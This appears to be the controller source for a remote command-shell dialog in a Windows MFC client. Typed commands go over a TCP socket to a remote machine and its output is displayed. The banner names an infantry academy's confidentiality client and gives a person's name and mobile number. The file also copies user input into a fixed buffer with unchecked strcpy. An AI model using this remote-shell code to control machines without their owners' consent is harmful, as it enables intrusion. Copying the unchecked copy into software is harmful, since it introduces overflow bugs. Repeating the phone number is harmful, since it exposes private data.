// ShellDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "comm.h"
#include "TcpTran.h"


CWinThread *pCmdShellThread	= NULL;

UINT CmdShellThread(LPVOID lparam)
{
	CTcpTran m_tcptran;

	COMMAND m_control;
	memset(&m_control,0,sizeof(COMMAND));
	m_control.wCmd = CMD_CMDSHELL;
	

	CShellDlg *pDlg=(CShellDlg *)lparam;

	if(pDlg->m_command=="")
	{
		ExitThread(0);//无命令,退出线程
	}

	if(pDlg->ClientSocket!=INVALID_SOCKET)
	{
	    int ret;
	    char RecvBuf[1024]={0};    //接收缓冲
	    char command[120];
 		strcpy(command,pDlg->m_command);  
		strcpy(m_control.szCurDir,command);
 
		ret=m_tcptran.mysend(pDlg->ClientSocket,(char *)&m_control,sizeof(m_control),0,60);//开启CMDSHELL	
		while(ret>0)
		{
			ret=m_tcptran.myrecv(pDlg->ClientSocket,RecvBuf,sizeof (RecvBuf),0,10,0,true); //接收目标数据
            if(ret<=0||RecvBuf[0]==MY_END)
				break;
			//表示接收到数据
			CString current;
			pDlg->m_CmdEdit.GetWindowText(current);
		    pDlg->m_CmdEdit.SetWindowText(current+RecvBuf);
		    memset(RecvBuf,0,sizeof(RecvBuf));  //缓冲清零
			pDlg->m_CmdEdit.LineScroll(pDlg->m_CmdEdit.GetLineCount());
		}
	}
	pCmdShellThread = NULL;
	return 0;	
}


// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(SOCKET s,CWnd* pParent /*=NULL*/)
	: CDialogEx(CShellDlg::IDD, pParent)
{
	ClientSocket = s;
	m_command = _T("");
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_CmdEdit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_BN_CLICKED(IDC_EXECUTE, &CShellDlg::OnClickedExecute)
	ON_WM_CTLCOLOR()
	ON_WM_SHOWWINDOW()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


void CShellDlg::OnClickedExecute()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData();
	CString str;
	GetDlgItemText(IDC_EDIT2,str);
	m_command = str;
	//AfxMessageBox(m_command);
    if(pCmdShellThread != NULL)
	{
	  ::TerminateThread(pCmdShellThread->m_hThread, 0);
	  ::WaitForSingleObject(pCmdShellThread->m_hThread, INFINITE);
	  CloseHandle(pCmdShellThread->m_hThread);
	  pCmdShellThread = NULL;
	}
	pCmdShellThread = AfxBeginThread(CmdShellThread, (LPVOID)this);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	if( nCtlColor == CTLCOLOR_EDIT)
	{
		pDC->SetBkMode(TRANSPARENT);
		COLORREF COLOR = RGB(0, 0, 0);
		HBRUSH brush = CreateSolidBrush(COLOR); //COLOR是你想设置的颜色 
		pDC->SetTextColor(RGB(255, 255, 255));
	 	return (HBRUSH) brush;	
	}	
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}

BOOL CShellDlg::OnInitDialog()
{

	CDialog::OnInitDialog();

	SetDlgItemText(IDC_EDIT2,"  ");

	//UpdateData(FALSE);

	return TRUE;
	
}

void CShellDlg::OnShowWindow(BOOL bShow, UINT nStatus)
{
	CDialogEx::OnShowWindow(bShow, nStatus);

	// TODO: 在此处添加消息处理程序代码
	m_cmd = "步兵学院保密管理客户端v1.0  如有问题请联系仇天舒17768386540";
	
	//SetDlgItemText(IDC_EDIT_CMDTEXT,m_cmd);
	m_CmdEdit.SetWindowText(m_cmd);

	if(pCmdShellThread != NULL)
	{
	  ::TerminateThread(pCmdShellThread->m_hThread, 0);
	  ::WaitForSingleObject(pCmdShellThread->m_hThread, INFINITE);
	  CloseHandle(pCmdShellThread->m_hThread);
	  pCmdShellThread = NULL;
	}

	CDialog::OnShowWindow(bShow, nStatus);
}
